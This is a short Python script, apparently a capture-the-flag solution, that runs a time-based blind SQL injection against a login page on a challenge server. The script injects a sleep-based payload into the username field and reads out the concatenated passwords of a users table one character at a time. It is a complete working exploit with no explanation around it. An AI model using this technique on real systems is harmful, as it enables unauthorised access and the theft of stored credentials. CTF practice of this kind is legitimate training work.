import requests
import time

url = "http://challenge.qsnctf.com:37231/login.php"
res = ""

for i in range(1, 48, 1):
    for j in range(32, 128, 1):
        payload = f"if(ascii(substr((select group_concat(password) from users),{i},1))>{j},sleep(0.5),0)#"
        data = {
            'uname': "admin' and " + payload,
            'psw': "123456"
        }
        try:
            start = time.time()
            r = requests.post(url=url, data=data, timeout=1.2)
            spend = time.time() - start
            # 耗时超过0.45s 代表sleep触发，字符大于j
            if spend > 0.45:
                continue
            else:
                res += chr(j)
                print("当前结果：", res)
                break
        except Exception as e:
            continue
print("\n最终数据：", res)